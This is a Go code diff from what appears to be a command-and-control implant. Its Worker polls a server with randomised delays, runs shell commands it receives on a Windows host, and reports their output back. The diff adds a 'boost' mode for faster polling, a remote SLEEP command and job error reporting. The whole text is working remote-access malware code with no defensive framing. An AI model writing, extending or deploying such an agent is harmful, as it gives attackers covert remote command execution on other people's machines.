@@ -32,8 +32,9 @@ const (
 )
 
 type Worker struct {
-	id      string
-	isAdmin bool
+	id        string
+	isAdmin   bool
+	boostMode bool // TODO: after new start we need to notify server about disabled boost!
 }
 
 type HostInfo struct {
@@ -143,17 +144,33 @@ func (w *Worker) poll() {
 			w.resolve(j)
 		}
 	end:
-		time.Sleep(time.Duration(utils.RandomInt(minDelay, maxDelay)) * time.Second)
+		if w.boostMode {
+			time.Sleep(time.Duration(minDelay) * time.Second)
+		} else {
+			time.Sleep(time.Duration(utils.RandomInt(minDelay, maxDelay)) * time.Second)
+		}
 	}
 }
 
 func (w *Worker) resolve(job Job) {
 	todo, args := parseJob(job.Todo)
 	switch todo {
-	case UNKNOWN:
 	case SHELL_CMD:
-		output, _ := win.ExecuteCommand(args...)
+		output, _ := win.ExecuteCommand(args...) // TODO: check for errors and send error message as report
 		w.report(job.Id, output)
+	case BOOST:
+		w.boostMode = args[0] == "on" // TODO: check inside parseJob whether args are correct
+		w.report(job.Id, "Boost mode changed.")
+	case SLEEP:
+		val, err := strconv.Atoi(args[0])
+		if err != nil {
+			w.report(job.Id, err.Error())
+		} else {
+			w.report(job.Id, "Sleeping for "+args[0]+" seconds.")
+			time.Sleep(time.Duration(val) * time.Second)
+		}
+	case UNKNOWN:
+		w.report(job.Id, "Received job has wrong format.")
 	}
 }
 
